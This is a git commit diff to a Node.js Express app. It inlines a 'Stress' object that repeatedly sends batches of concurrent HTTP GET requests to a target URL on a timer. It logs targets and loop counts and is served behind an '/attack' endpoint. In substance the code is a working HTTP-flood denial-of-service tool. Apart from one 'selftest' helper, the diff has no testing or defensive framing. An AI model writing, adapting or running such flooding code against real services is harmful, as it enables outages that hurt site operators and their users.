558ec1e2b6752be2508d48625839cc5b835505fb
Adam Adamovych <adamkovuch@gmail.com>
2022-02-26 15:13:12 +0200

    update

--- index.js
+++ index.js
@@ -1,7 +1,45 @@
 'use strict';
 
-const Stress = require('./stress');
-const express = require('express');
+import express from "express";
+import got from 'got';
+
+
+
+
+function Stress() { 
+    this.stats = {
+        errors: 0,
+        success: 0,
+        loop: 0
+    };
+}
+
+Stress.prototype.run = function(url, concurent, intervalTime) {
+    this.target = url;
+    const attack = () => {
+        for(var i = 0; i < concurent; i += 1) {
+            got.get(url, {timeout: {
+                request: 3000
+            }})
+                .then(res => res.statusCode >= 200 && res.statusCode < 300 ? this.stats.success += 1 : this.stats.errors += 1)
+                .catch(() => this.stats.errors += 1);
+        }
+        this.stats.loop += 1;
+
+        console.log("Target: "+this.target+" Loop: "+this.stats.loop+" Current stats: errors("+this.stats.errors+") success("+this.stats.success+")");
+    };
+
+    setInterval(attack, intervalTime);
+}
+
+Stress.prototype.resetStats = function () {
+    this.stats = {
+        errors: 0,
+        success: 0,
+        loop: 0
+    };
+}
+
 
 // Constants
 const PORT = process.env.PORT || 8080;
@@ -32,18 +70,16 @@ app.get('/attack', (req, res) => {
 app.listen(PORT);
 console.log(`Running on ${PORT} port`);
 
-
-
-var request = require('superagent');
 const selfTest = () => {
     const url = process.env.URL;
     if(!url) return;
 
-    request.get(url)
-        .end(function(err, res) {
-            if(!err) {
-                console.log('selftest OK');
-            }
+    got.get(url)
+        .then(function() {
+            console.log('selftest OK');
+        })
+        .catch(function() {
+            console.error('selftest error');
         });
 };
 
